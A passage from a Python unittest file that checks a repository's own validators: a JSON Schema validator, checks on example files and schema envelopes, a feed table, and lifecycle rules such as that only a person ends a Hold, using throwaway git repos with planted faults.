"""The checks themselves must catch what they claim to catch.

`tree()` builds a throwaway repo holding a planted fault. `clone()` copies this repo and plants
one in the copy, so that a check is run from its front door and not only by its parts.
"""
from __future__ import annotations

import ast
import base64
import contextlib
import copy
import hashlib
import importlib.machinery
import io
import json
import os
import pathlib
import re
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

from kernel import decide as decide_module, derive, issue, terms
from kernel.decide import decide
from sim import world
from tests import support
from tools import (check_apps, check_authority, commits_are_the_maintainers, check_context, check_decisions, check_examples, check_lifecycle,
                   check_purity, check_repo, check_trials, check_workflows, mutants, needs_passed, redact_trial, verify,
                   walk)
from tools.hooks import protected
from tools.jsonschema_lite import SchemaError, validate

ROOT = check_authority.ROOT
GOOD = (ROOT / "examples" / "workflows" / "verify.yml").read_text()
STEP = "      - run: make verify\n"


SCRATCH = tempfile.TemporaryDirectory()     # removed when the run ends


def tree(files: dict) -> pathlib.Path:
    """A throwaway repo holding `files`, for a check to be run against."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def clone(files: dict) -> pathlib.Path:
    """A copy of this repo with `files` written over it."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "repo"
    walk.copy(ROOT, root)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def modules_in(suite) -> set:
    """The modules whose tests are in `suite`, at any depth."""
    found = set()
    for item in suite:
        if isinstance(item, unittest.TestSuite):
            found |= modules_in(item)
        else:
            found.add(type(item).__module__)
    return found


FILE, GITLINK = 0o100644, 0o160000


def git_index(paths: dict, version: int = 2) -> bytes:
    """git's index as git writes it, holding `paths` ({path: mode}). Version 3 marks every entry extended."""
    out, previous = b"", b""
    for path, mode in sorted(paths.items()):
        name = path.encode()
        flags = len(name) | (0x4000 if version == 3 else 0)
        entry = bytes(24) + mode.to_bytes(4, "big") + bytes(32) + flags.to_bytes(2, "big")
        entry += bytes(2) if version == 3 else b""
        if version == 4:    # the path is cut to what differs from the one before, and not padded
            same = len(os.path.commonprefix([previous, name]))
            entry += bytes([len(previous) - same]) + name[same:] + b"\0"
        else:
            entry += name + b"\0" * (8 - (len(entry) + len(name)) % 8)
        out, previous = out + entry, name
    data = b"DIRC" + version.to_bytes(4, "big") + len(paths).to_bytes(4, "big") + out
    return data + hashlib.sha1(data, usedforsecurity=False).digest()


def commit(root: pathlib.Path, paths: dict, version: int = 2) -> pathlib.Path:
    """Write git's index into `root`, as though `paths` had been committed. Returns `root`."""
    (root / ".git").mkdir(exist_ok=True)
    (root / ".git" / "index").write_bytes(git_index(paths, version))
    return root


def git(root: pathlib.Path, *args: str) -> str:
    """Run git in `root`, apart from this machine's configuration and any git that is running this."""
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    return subprocess.run(["git", "-C", str(root), *args], env=env, check=True, capture_output=True, text=True).stdout


def staged(files: dict, *config: str, objects: str = "sha1") -> pathlib.Path:
    """A repo holding `files`, all added by git itself, after `config` ("key=value") is set. Nothing is committed."""
    root = tree(files)
    git(root, "init", "-q", "--object-format=" + objects)
    for setting in config:
        git(root, "config", *setting.split("=", 1))
    git(root, "add", "-f", ".")
    return root


def held_by_git(root: pathlib.Path) -> dict:
    """{path: mode} as git itself lists its index."""
    entries = (line.split("\t", 1) for line in git(root, "ls-files", "-s", "-z").split("\0") if line)
    return {path: int(meta.split()[0], 8) for meta, path in entries}


def checked(data: bytes) -> bytes:
    """`data`, an index without its last 20 bytes, with a SHA-1 of it put back."""
    return data + hashlib.sha1(data, usedforsecurity=False).digest()


def caught(problems: list, words: str) -> bool:
    return any(words in p for p in problems)


WALKS = {"walk", "fwalk", "rglob", "scandir", "copytree"}


def walkers(source: str) -> list:
    """(line, name) for each way `source` walks or copies a tree, read from its syntax, not its spelling."""
    found = []
    for node in ast.walk(ast.parse(source)):
        line = getattr(node, "lineno", 0)
        syntax = isinstance(node, ast.Attribute) and getattr(node.value, "id", "") == "ast"   # ast.walk
        if isinstance(node, ast.Attribute) and node.attr in WALKS and not syntax:
            found.append((line, node.attr))
        elif isinstance(node, ast.ImportFrom) and node.module != "tools":
            found += [(line, a.name) for a in node.names if a.name in WALKS]
        elif isinstance(node, ast.Call):
            name = getattr(node.func, "attr", getattr(node.func, "id", ""))
            if name in WALKS and isinstance(node.func, ast.Name):
                found.append((line, name))
            recursive = any(k.arg == "recursive" and not (isinstance(k.value, ast.Constant) and k.value.value is False)
                            for k in node.keywords)
            starred = any(isinstance(a, ast.Constant) and "**" in str(a.value) for a in node.args)
            if name in ("glob", "iglob") and (recursive or starred):
                found.append((line, name))
    return found


def rules(text: str) -> list:
    return sorted({rule for rule, _ in check_workflows.lint(text)})


class Validator(unittest.TestCase):
    def test_rejects_a_schema_it_cannot_enforce(self):
        with self.assertRaises(SchemaError):
            validate({}, {"type": "object", "patternProperties": {}})

    def test_a_boolean_is_not_an_integer(self):
        self.assertTrue(validate(True, {"type": "integer"}))

    def test_unexpected_property_is_an_error(self):
        schema = {"type": "object", "additionalProperties": False, "properties": {"a": {"type": "string"}}}
        self.assertEqual(validate({"a": "x", "b": 1}, schema), ["$: unexpected b"])

    def test_an_item_given_twice_is_an_error_where_items_are_unique(self):
        unique = {"type": "array", "uniqueItems": True}
        self.assertEqual(validate(["AC-1", "AC-2"], unique), [])
        self.assertEqual(validate(["AC-1", "AC-2", "AC-1"], unique), ["$: an item is given twice"])
        self.assertEqual(validate([{"a": 1, "b": 2}, {"b": 2, "a": 1}], unique), ["$: an item is given twice"])
        # The other side: without the keyword, or with it false, an item may come twice.
        for schema in ({"type": "array"}, {"type": "array", "uniqueItems": False}):
            self.assertEqual(validate(["AC-1", "AC-1"], schema), [])

    def test_a_code_that_ends_in_a_newline_is_not_a_code(self):
        code = {"type": "string", "pattern": "^[a-z_]+$"}
        self.assertEqual(validate("empty_diff", code), [])
        self.assertTrue(validate("empty_diff\n", code))

    def test_a_reference_to_another_schema_is_followed(self):  # decision 0038
        part = {"type": "object", "additionalProperties": False, "required": ["code"],
                "properties": {"code": {"$ref": "#/$defs/code"}},
                "$defs": {"code": {"type": "string", "pattern": "^[a-z_]+$"}, "kind": {"enum": ["a", "b"]}}}
        # The referrer has $defs of the same names and other shapes: a reference read against the wrong root shows.
        whole = {"type": "object", "additionalProperties": False,
                 "properties": {"part": {"$ref": "part.schema.json"}, "kind": {"$ref": "part.schema.json#/$defs/kind"}},
                 "$defs": {"code": {"type": "string", "pattern": "^[A-Z]+$"}, "kind": {"enum": ["c"]}}}
        schemas = {"part": part, "whole": whole}
        self.assertEqual(validate({"part": {"code": "fix_incomplete"}, "kind": "a"}, whole, schemas=schemas), [])
        self.assertEqual(validate({"part": {"code": "FIX"}}, whole, schemas=schemas),
                         ["$.part.code: does not match ^[a-z_]+$"])
        self.assertEqual(validate({"kind": "c"}, whole, schemas=schemas), ["$.kind: 'c' is not one of ['a', 'b']"])
        self.assertEqual(validate({"part": {"code": "fix_incomplete", "by": "x"}}, whole, schemas=schemas),
                         ["$.part: unexpected by"])

    def test_a_reference_to_a_schema_not_given_is_refused(self):  # decision 0038
        by_file = {"type": "object", "properties": {"a": {"$ref": "part.schema.json"}}, "additionalProperties": False}
        with self.assertRaises(SchemaError):
            validate({"a": {}}, by_file)
        with self.assertRaises(SchemaError):
            validate({"a": {}}, by_file, schemas={"other": {"type": "object", "additionalProperties": False}})
        with self.assertRaises(SchemaError):
            validate({}, {"$ref": "part.schema.json#/$defs/x"}, schemas={"part": {"$defs": {}}})
        with self.assertRaises(SchemaError):
            validate({}, {"$ref": "../part.schema.json"}, schemas={"part": {}})
        # A mapping that has it, by file or by fragment, is followed; nothing is read from disk for it.
        given = {"part": {"type": "object", "additionalProperties": False, "$defs": {"x": {"const": 1}}}}
        self.assertEqual(validate({"a": {}}, by_file, schemas=given), [])
        self.assertEqual(validate(1, {"$ref": "part.schema.json#/$defs/x"}, schemas=given), [])

    def test_a_reference_that_comes_round_to_itself_is_refused(self):  # decision 0038
        # A cycle of references consumes no value, so it would recurse without bound: it is refused as a SchemaError,
        # not left to crash. A reference reached again under a deeper value is not a cycle.
        schemas = {"a": {"$ref": "b.schema.json"}, "b": {"$ref": "a.schema.json"}}
        with self.assertRaises(SchemaError):
            validate({}, schemas["a"], schemas=schemas)
        local = {"$defs": {"x": {"$ref": "#/$defs/x"}}, "$ref": "#/$defs/x"}
        with self.assertRaises(SchemaError):
            validate(1, local)
        nested = {"type": "array", "items": {"$ref": "#/$defs/n"},
                  "$defs": {"n": {"type": "array", "items": {"$ref": "#/$defs/n"}}}}
        self.assertEqual(validate([[[]]], nested), [])
        self.assertTrue(validate([[1]], nested))

    def test_a_reference_with_keywords_beside_it_is_refused(self):  # decision 0038
        # The validator reads a $ref and nothing beside it, so a keyword beside one would be a promise nothing enforces.
        schema = {"$ref": "#/$defs/s", "enum": ["only"], "$defs": {"s": {"type": "string"}}}
        with self.assertRaises(SchemaError):
            validate("anything", schema)
        self.assertEqual(validate("anything", {"$ref": "#/$defs/s", "title": "an annotation is not a keyword",
                                               "$defs": {"s": {"type": "string"}}}), [])

    def test_a_schema_that_accepts_unknown_fields_is_caught(self):
        self.assertEqual(check_examples._open({"type": "object", "properties": {"a": {"type": "object"}}}),
                         ["$", "$.properties.a"])
        self.assertEqual(check_examples._open({"type": "object", "additionalProperties": {"type": "string"}}), [])
        for loose in (None, "no", {}, True):
            self.assertEqual(check_examples._open({"type": ["object", "null"], "additionalProperties": loose}), ["$"])

    def test_a_key_written_twice_is_refused(self):
        path = tree({"x.json": '{"limit": 3, "limit": 30}'}) / "x.json"
        with self.assertRaises(ValueError):
            check_examples._load(path)


class Examples(unittest.TestCase):
    def test_a_counter_example_that_is_accepted_is_caught(self):
        fine = (ROOT / "examples" / "facts.json").read_text()
        root = clone({"examples/invalid/facts.carries-prose.json": fine})
        self.assertTrue(caught(check_examples.run(root), "was accepted, and must be rejected"))

    def test_a_counter_example_wrong_in_two_ways_is_caught(self):
        facts = json.loads((ROOT / "examples" / "invalid" / "facts.carries-prose.json").read_text())
        facts["schema"] = "facts/2"
        root = clone({"examples/invalid/facts.carries-prose.json": json.dumps(facts)})
        self.assertTrue(caught(check_examples.run(root), "is wrong in 2 ways"))

    def test_an_example_that_does_not_validate_is_caught(self):
        self.assertTrue(caught(check_examples.run(clone({"examples/decision.json": "{}"})), "decision.json: $: missing"))

    def test_a_coverage_that_leaves_a_criterion_uncovered_is_caught(self):  # decision 0029
        # Valid to its schema, a coverage example is judged by kernel/coverage.py too, against the rubric, the Finding
        # example and the paths the facts example changes: no schema can say every criterion that applies is there.
        left = (ROOT / "examples" / "invalid" / "coverage.a-criterion-that-applies-left-out.json").read_text()
        whole = (ROOT / "examples" / "coverage.json").read_text()
        self.assertTrue(caught(check_examples.run(clone({"examples/coverage.json": left})),
                               "coverage.json: $: uncovered PR-4"))
        self.assertTrue(caught(check_examples.run(clone({"examples/invalid/coverage.a-criterion-that-applies-left-out"
                                                         ".json": whole})), "was accepted, and must be rejected"))
        problems = check_examples.run(clone({"examples/finding.json": "{}"}))
        self.assertTrue(caught(problems, "coverage.json: $: uncovered PR-3"))

    def test_a_string_that_is_neither_a_code_nor_a_body_is_caught(self):  # decision 0038
        # What one Run carries holds codes: a bare string, or a pattern not anchored at both ends, is text. The walk is
        # asked directly, since every mutant runs the whole suite; the check is run from its front door once.
        schemas = {p.name[: -len(".schema.json")]: json.loads(p.read_text())
                   for p in (ROOT / "schemas").glob("*.schema.json")}

        def free(kind: str, schema: dict) -> list:
            return check_examples._free(schema, dict(schemas, **{kind: schema}), schema, kind, "$", set())

        def disposition(**fields) -> dict:
            bare = copy.deepcopy(schemas["disposition"])
            for name, value in fields.items():
                (bare["properties"]["decision"]["properties"] if name == "reason" else bare["properties"])[name] = value
            return bare

        # A pattern anchored only in its writing is not anchored: an alternative outside the anchors, or an escaped $.
        for loose in ({"type": "string"}, {"type": "string", "pattern": "[a-z_]+"}, {"type": ["string", "null"]}, {},
                      {"type": "string", "pattern": "^fixed$|b$"}, {"type": "string", "pattern": "^[a-z]+\\$"}):
            self.assertTrue(caught(free("disposition", disposition(reason=loose)),
                                   "schema disposition admits text at $.decision.reason"), loose)
        problems = check_examples.run(clone({"schemas/disposition.schema.json":
                                             json.dumps(disposition(reason={"type": "string"}))}))
        self.assertTrue(caught(problems, "schema disposition admits text at $.decision.reason"))
        # A string in a schema a Run's schema reaches by reference is held the same way.
        coverage = copy.deepcopy(schemas["coverage"])
        del coverage["items"]["properties"]["reason"]["pattern"]
        result = schemas["result"]
        problems = check_examples._free(result, dict(schemas, coverage=coverage), result, "result", "$", set())
        self.assertTrue(caught(problems, "schema coverage admits text at $.coverage[].reason"))
        # A property named body is text, and passes: the Effect's comments, annotations and review body are.
        for kind in check_examples.CODES_ONLY:
            self.assertEqual(free(kind, schemas[kind]), [], kind)
        self.assertEqual(check_examples._free({"type": "object", "additionalProperties": False,
                                               "properties": {"body": {"type": "string"}}}, {}, {}, "x", "$", set()), [])
        # A reference the walk cannot follow is a problem too: validate() follows one only where a value reaches it.
        # So are a reference that comes round to itself, and a keyword beside one, in a branch no example takes.
        self.assertTrue(caught(free("disposition", disposition(note={"$ref": "nope.schema.json"})),
                               "schema disposition cannot be followed at $.note"))
        looped = disposition(note={"$ref": "#/$defs/loop"})
        looped["$defs"] = {"loop": {"$ref": "#/$defs/loop"}}
        self.assertTrue(caught(free("disposition", looped), "schema disposition comes round to itself at $.note"))
        self.assertTrue(caught(free("disposition", disposition(note={"$ref": "effect.schema.json", "enum": ["only"]})),
                               "schema disposition has ['enum'] beside a $ref at $.note"))
        for held in ("^(item|PRRT_[A-Za-z0-9_-]+)$", "^[^\\s]+$", "^a\\|b$", "^[|$]+$", "^(a|(b|c))$"):
            self.assertTrue(check_examples._anchored(held), held)
        for loose in ("^fixed$|b$", "^[a-z]+\\$", "^a|b$", "a$", "^a", "^(a|b)$|^c$", None, 3):
            self.assertFalse(check_examples._anchored(loose), loose)

    def test_a_schema_without_its_envelope_is_caught(self):  # decision 0039
        schemas = {p.name[: -len(".schema.json")]: json.loads(p.read_text())
                   for p in (ROOT / "schemas").glob("*.schema.json")}
        for kind, schema in sorted(schemas.items()):
            self.assertEqual(check_examples._envelope(kind, schema), [], kind)
        self.assertEqual(set(schemas), set(check_examples.ENVELOPE))
        # A document carries schema, its identity and release; a record or a data file schema alone; a part nothing.
        doc = copy.deepcopy(schemas["outcome"])
        del doc["properties"]["release"]
        doc["required"].remove("release")
        self.assertTrue(caught(check_examples._envelope("outcome", doc), "is a document and does not require release"))
        for run in ({"type": "string"}, {"type": ["string", "null"], "pattern": "^r_[0-9A-Z]{6,26}$"},
                    {"pattern": "^r_[0-9A-Z]{6,26}$"}):
            doc = copy.deepcopy(schemas["outcome"])
            doc["properties"]["run"] = run
            self.assertTrue(caught(check_examples._envelope("outcome", doc), "identity, run, is a string with a pattern"),
                            run)
        doc = copy.deepcopy(schemas["outcome"])
        del doc["properties"]["release"]["type"]
        self.assertTrue(caught(check_examples._envelope("outcome", doc), "release is a string in the Factory's release"))
        doc = copy.deepcopy(schemas["outcome"])
        doc["properties"]["schema"] = {"const": "result/1"}
        self.assertTrue(caught(check_examples._envelope("outcome", doc), "not a const naming outcome"))
        part = copy.deepcopy(schemas["effect"])
        part["properties"]["schema"] = {"const": "effect/1"}
        self.assertTrue(caught(check_examples._envelope("effect", part), "is a part, and carries a schema field"))
        part = copy.deepcopy(schemas["effect"])
        part["properties"]["release"] = {"type": "string", "pattern": check_examples.RELEASE}
        self.assertTrue(caught(check_examples._envelope("effect", part), "is a part, and carries a release"))
        for kind in ("decision", "config"):
            loose = copy.deepcopy(schemas[kind])
            loose["properties"]["release"] = {"type": "string"}
            self.assertTrue(caught(check_examples._envelope(kind, loose), "carries a release"))
            loose = copy.deepcopy(schemas[kind])
            loose["required"].remove("schema")
            self.assertTrue(caught(check_examples._envelope(kind, loose), "does not require its schema field"))
        self.assertTrue(caught(check_examples._envelope("verdict", {"type": "object"}), "is in no class of ENVELOPE"))
        # From the front door: a schema in no class, and a class naming a kind with no schema.
        root = clone({"schemas/verdict.schema.json": '{"type": "object", "additionalProperties": false}'})
        self.assertTrue(caught(check_examples.run(root), "schema verdict is in no class of ENVELOPE"))
        with mock.patch.dict(check_examples.ENVELOPE, {"verdict": "part"}):
            self.assertTrue(caught(check_examples.run(), "ENVELOPE names verdict, and there is no such schema"))

    def test_text_is_let_through_only_untrusted_or_in_a_body(self):  # decision 0039
        marked = {"type": "object", "additionalProperties": False, "required": ["untrusted"],
                  "properties": {"untrusted": {"type": "object", "additionalProperties": False,
                                               "properties": {"title": {"type": "string"}}}}}
        self.assertEqual(check_examples._free(marked, {}, marked, "view-item", "$", set()), [])
        beside = copy.deepcopy(marked)
        beside["properties"]["title"] = {"type": "string"}
        self.assertTrue(caught(check_examples._free(beside, {}, beside, "view-item", "$", set()),
                               "schema view-item admits text at $.title"))
        # The feed's own schema holds its title so, and nothing else on it is text.
        schemas = {p.name[: -len(".schema.json")]: json.loads(p.read_text())
                   for p in (ROOT / "schemas").glob("*.schema.json")}
        item = schemas["view-item"]
        self.assertEqual(check_examples._free(item, schemas, item, "view-item", "$", set()), [])
        self.assertEqual(sorted(item["properties"]["untrusted"]["properties"]), ["title"])
        # Only the feed marks text untrusted: the same property in a Task, which goes to the model, is caught. And a
        # body is one string: an object of strings under that name is caught too.
        self.assertTrue(caught(check_examples._free(marked, {}, marked, "task", "$", set()),
                               "schema task admits text at $.untrusted.title"))
        boxed = {"type": "object", "additionalProperties": False,
                 "properties": {"body": {"type": "object", "additionalProperties": False,
                                         "properties": {"note": {"type": "string"}}}}}
        self.assertTrue(caught(check_examples._free(boxed, {}, boxed, "task", "$", set()),
                               "schema task admits text at $.body.note"))
        for kind in check_examples.CODES_ONLY:
            if kind != check_examples.UNTRUSTED_KIND:
                self.assertNotIn("untrusted", schemas[kind].get("properties", {}), kind)

    def test_the_example_pass_record_replays(self):  # decision 0039, decision 0002
        # Every Decision in the pass record is the Kernel's own answer on the facts, runs, context and time it holds,
        # with the Release's data files: the record is enough to replay a pass on a laptop.
        record = json.loads((ROOT / "examples" / "pass.json").read_text())
        issues = dict(support.CONFIG, lifecycle=json.loads((ROOT / "lifecycle" / "issue.json").read_text()))
        self.assertTrue(record["pull_requests"] and record["issues"])
        for entry in record["pull_requests"]:
            self.assertEqual(decide(entry["facts"], record["runs"], record["context"], support.CONFIG, record["now"]),
                             entry["decision"])
        for entry in record["issues"]:
            self.assertEqual(issue.decide(entry["facts"], record["runs"], record["context"], issues, record["now"]),
                             entry["decision"])
        # A Run id stands beside an admission or an approval, which is a Run, and is null anywhere else.
        for entry in record["pull_requests"] + record["issues"]:
            minted = entry["decision"]["outcome"] == "admit" or entry["decision"].get("action") == "issue_approval"
            self.assertEqual(entry["run"] is not None, minted, entry["decision"])

    def test_the_pass_record_holds_the_kernels_whole_context(self):  # decision 0039
        context = json.loads((ROOT / "schemas" / "pass.schema.json").read_text())["$defs"]["context"]
        self.assertEqual(set(context["properties"]), set(support.context()))
        self.assertEqual(set(context["required"]), set(support.context()))
        self.assertIs(context["additionalProperties"], False)

    def test_the_feed_shows_only_what_a_decision_can_say(self):  # decision 0039
        item = json.loads((ROOT / "schemas" / "view-item.schema.json").read_text())["properties"]
        pull = json.loads((ROOT / "schemas" / "decision.schema.json").read_text())["properties"]
        issue_ = json.loads((ROOT / "schemas" / "issue-decision.schema.json").read_text())["properties"]
        self.assertEqual(set(item["state"]["enum"]), set(pull["state"]["enum"]) | set(issue_["state"]["enum"]))
        self.assertEqual(item["attention"]["enum"], pull["attention"]["enum"])
        self.assertEqual(item["attention"]["enum"], issue_["attention"]["enum"])
        self.assertEqual(item["reason"], pull["reason"])

    def test_every_reason_that_needs_a_person_says_what_is_asked(self):  # decision 0039
        feed = json.loads((ROOT / "config" / "feed.json").read_text())
        schema = json.loads((ROOT / "schemas" / "decision.schema.json").read_text())
        self.assertEqual(check_examples._table(feed, schema), [])
        # The three reasons beside the Kernel's own sets are given needs_you by the Kernel.
        d = support.facts(queue=True, reviews=[support.review()], author="donpetry-bot")
        for paused, why in ((True, "paused"), (None, "pause_unreadable")):
            said = decide(d, [support.run()], support.context(paused=paused), support.CONFIG, support.NOW)
            self.assertEqual((said["reason"], said["attention"]), (why, "needs_you"))
        from tests import test_issue
        past = test_issue.facts(label_events=test_issue.READIED_BY_A_PERSON,
                                linked=test_issue.closed_links(*range(2, 3 + test_issue.LIMITS["max_unmerged_closes"])))
        said = issue.decide(past, [], support.context(), test_issue.config(), support.NOW)
        self.assertEqual((said["reason"], said["attention"]), ("unmerged_closes", "needs_you"))
        for reason in check_examples.ALSO_NEEDS_YOU:
            self.assertNotIn(reason, decide_module.NEEDS_YOU_REASONS | issue.NEEDS_YOU_REASONS)
        # Each fault: a row taken out, a row for a reason that never needs a person, a reason twice, a class unruled.
        broken = copy.deepcopy(feed)
        taken = broken["decision_required"].pop(0)
        self.assertTrue(caught(check_examples._table(broken, schema),
                               "the reason %s needs a person, and no row says what is asked" % taken["reason"]))
        broken = copy.deepcopy(feed)
        broken["decision_required"].append(dict(taken, reason="findings_open"))
        self.assertTrue(caught(check_examples._table(broken, schema), "a row for findings_open, a reason the Kernel never"))
        broken = copy.deepcopy(feed)
        broken["decision_required"].append(taken)
        self.assertTrue(caught(check_examples._table(broken, schema), "the reason %s has two rows" % taken["reason"]))
        broken = copy.deepcopy(feed)
        rule = broken["next_actor"]["by_attention"].pop(0)
        self.assertTrue(caught(check_examples._table(broken, schema), "class %s has no rule" % rule["attention"]))
        broken["next_actor"]["by_attention"] += [rule, rule]
        self.assertTrue(caught(check_examples._table(broken, schema), "class %s has two rules" % rule["attention"]))
        broken = copy.deepcopy(feed)
        broken["next_actor"]["by_state"]["rows"].append({"state": "queued", "actor": "lens"})
        broken["next_actor"]["by_outcome"].append({"outcome": ["admit"], "actor": "nobody"})
        problems = check_examples._table(broken, schema)
        self.assertTrue(caught(problems, "the State queued has two rules"))
        self.assertTrue(caught(problems, "the outcome admit has two rules"))
        # And from the front door, on the live file.
        root = clone({"config/feed.json": json.dumps(dict(feed, decision_required=feed["decision_required"][1:]))})
        self.assertTrue(caught(check_examples.run(root), "config/feed.json: feed: the reason"))

    def test_the_example_feed_follows_the_table(self):  # decision 0039
        feed = json.loads((ROOT / "config" / "feed.json").read_text())

        def next_actor(d: dict) -> str:
            for row in feed["next_actor"]["by_outcome"]:
                if d["outcome"] in row["outcome"]:
                    return row["actor"]
            actor = {row["attention"]: row["actor"] for row in feed["next_actor"]["by_attention"]}[d["attention"]]
            if actor != "by_state":
                return actor
            by_state = {row["state"]: row["actor"] for row in feed["next_actor"]["by_state"]["rows"]}
            return by_state.get(d["state"], feed["next_actor"]["by_state"]["default"])

        def decision_required(d: dict):
            if d["attention"] != "needs_you":
                return None
            row = {row["reason"]: row for row in feed["decision_required"]}[d["reason"]]
            return {"question": row["question"], "choices": row["choices"], "evidence": d["evidence"]}

        items = json.loads((ROOT / "examples" / "view-items.json").read_text())["items"]
        for item in items:
            codes = {"outcome": "nothing" if item["attention"] != "working" else "defer", **item}
            self.assertEqual(item["next_actor"], next_actor(codes), item["item"])
            self.assertEqual(item["decision_required"], decision_required(codes), item["item"])
        self.assertEqual({item["attention"] for item in items}, {"needs_you", "review"})
        # The table's own rules are the design's (section 8.4): a Decision about to admit or act is the Factory's, then
        # by class, then by State for the classes that wait on a Lens or the platform.
        for outcome in ("admit", "act"):
            self.assertEqual(next_actor({"outcome": outcome, "attention": "needs_you", "state": "held"}), "factory")
        for attention, actor in (("needs_you", "maintainer"), ("working", "factory"), ("failed", "author"), ("none", "nobody")):
            self.assertEqual(next_actor({"outcome": "nothing", "attention": attention, "state": "addressing"}), actor)
        for attention in ("review", "ready", "stale"):
            for state, actor in (("verifying", "lens"), ("adjudicating", "lens"), ("queued", "platform"),
                                 ("converged", "factory"), ("triage", "factory")):
                self.assertEqual(next_actor({"outcome": "defer", "attention": attention, "state": state}), actor)
        # A fact the Factory cannot read, or a Pause, is mended at its source; every other question can be closed.
        for row in feed["decision_required"]:
            mended = row["question"] in ("fact_unreadable", "paused", "configuration_needs_you")
            self.assertEqual("close" in row["choices"], not mended, row["reason"])

    def test_each_effect_type_is_requested_by_its_own_list(self):  # decision 0038
        # With no oneOf, one list for each type is the only shape in which "a resolve_thread with no thread" is refused.
        effect = json.loads((ROOT / "schemas" / "effect.schema.json").read_text())
        self.assertEqual(sorted(effect["$defs"]["type"]["enum"]), sorted(effect["properties"]))
        self.assertEqual(effect["required"] if "required" in effect else [], [])
        for name, listed in sorted(effect["properties"].items()):
            self.assertEqual(listed["type"], "array", name)
            self.assertIs(listed["items"]["additionalProperties"], False, name)
            self.assertIn("id", listed["items"]["required"], name)
        # The Controller's acts are never a Result's Effects, and a review carries no event: approval is the act Run's.
        for act in ("add_label", "remove_label", "assign", "enqueue_merge", "dequeue_merge"):
            self.assertNotIn(act, effect["properties"])
        self.assertNotIn("event", effect["properties"]["submit_review"]["items"]["properties"])

    def test_only_success_can_pass_a_check(self):  # I-27, L-07
        # The configuration may say what a conclusion means, but never that one with no verdict has passed.
        schema = json.loads((ROOT / "schemas" / "config.schema.json").read_text())
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(validate(defaults, schema), [])
        for conclusion in sorted(set(defaults["check_conclusions"]) - {"success"}) + ["a_value_github_adds_later"]:
            for reading in ("passing", None, "", "ignored"):
                cfg = copy.deepcopy(defaults)
                cfg["check_conclusions"][conclusion] = reading
                self.assertTrue(validate(cfg, schema), (conclusion, reading))
        for reading in ("failing", "pending", "unreadable", "missing"):
            cfg = copy.deepcopy(defaults)
            if reading == "missing":
                del cfg["check_conclusions"]["success"]
            else:
                cfg["check_conclusions"]["success"] = reading
            self.assertTrue(validate(cfg, schema), reading)

    def test_a_schema_with_no_example_and_a_data_file_with_no_schema_are_caught(self):
        root = clone({"schemas/verdict.schema.json": '{"type": "object", "additionalProperties": false}',
                      "config/extra.json": "{}", "examples/invalid/nothing.x.json": "{}"})
        problems = check_examples.run(root)
        self.assertTrue(caught(problems, "schema verdict has no example"))
        self.assertTrue(caught(problems, "config/extra.json is validated against no schema"))
        broken = check_examples.run(clone({"examples/facts.json": '{"schema": "facts/1", "schema": "facts/1"}',
                                           "schemas/rubric.schema.json": "{not json"}))
        self.assertTrue(caught(broken, "examples/facts.json cannot be read: a key is written twice"))
        self.assertTrue(caught(broken, "schemas/rubric.schema.json cannot be read"))
        self.assertTrue(caught(broken, "config/rubric-pr-review.json: no schema named rubric"))
        self.assertTrue(caught(problems, "no schema named nothing"))


def unbound(lc: dict, bound: str) -> dict:
    """`lc` with `bound` taken off every transition that names it."""
    return dict(lc, transitions=[dict(tr, bound=None) if tr["bound"] == bound else tr for tr in lc["transitions"]])


class Lifecycle(unittest.TestCase):
    def test_an_unbounded_factory_cycle_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) in (("adjudicating", "addressing"), ("addressing", "adjudicating")):
                tr["bound"] = None
        self.assertTrue(caught(check_lifecycle.check(lc), "a cycle with no person in it has no bound"))

    def test_a_dead_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["transitions"] = [tr for tr in lc["transitions"] if tr["from"] != "queued"]
        self.assertIn("no terminal state can be reached from: queued", check_lifecycle.check(lc))

    def test_a_hold_the_factory_could_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        # L-02. A Hold ends when a person acts, or when the content that caused it changes; never by the Factory.
        self.assertIn(("held", "verifying", "platform"), {(tr["from"], tr["to"], tr["by"]) for tr in lc["transitions"]})
        lc["transitions"].append({"from": "held", "to": "verifying", "by": "factory", "bound": "max_attempts"})
        self.assertIn("the Factory makes no transition out of a Hold: held -> verifying is by factory",
                      check_lifecycle.check(lc))

    def test_an_issue_the_factory_could_serve_again_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load("issue"))
        lc["transitions"].append({"from": "not_served", "to": "ready", "by": "factory", "bound": None})
        self.assertTrue(caught(check_lifecycle.check(lc), "only a person takes a Work item out of not_served"))

    def test_only_a_person_or_a_strangers_change_left_to_a_person_leaves_a_person_only_state(self):  # decision 0037
        # An outsider's edit makes an issue's acceptance lapse, from a Hold of the brakes too, and the issue then waits
        # for a person: the issue's Lifecycle declares it, bound by a person, and passes.
        lc = check_lifecycle.load("issue")
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertIn(("held", "new", "stranger", check_lifecycle.PERSON),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        self.assertEqual(check_lifecycle.check(lc, limits), [])
        # No one else leaves it: neither the platform nor a Lens.
        for by in ("platform", "lens"):
            tr = {"from": "held", "to": "new", "by": by, "bound": check_lifecycle.PERSON}
            problems = check_lifecycle.check(dict(lc, transitions=lc["transitions"] + [tr]), limits)
            self.assertTrue(caught(problems, "held is left by %s; only a person takes a Work item out of held" % by),
                            problems)
        # And a stranger's change names the bound person, out of a person-only State or any other.
        for start in ("held", "triage"):
            for bound in (None, "max_attempts"):
                transitions = [dict(tr, bound=bound) if (tr["from"], tr["by"]) == (start, "stranger") else tr
                               for tr in lc["transitions"]]
                problems = check_lifecycle.check(dict(lc, transitions=transitions), limits)
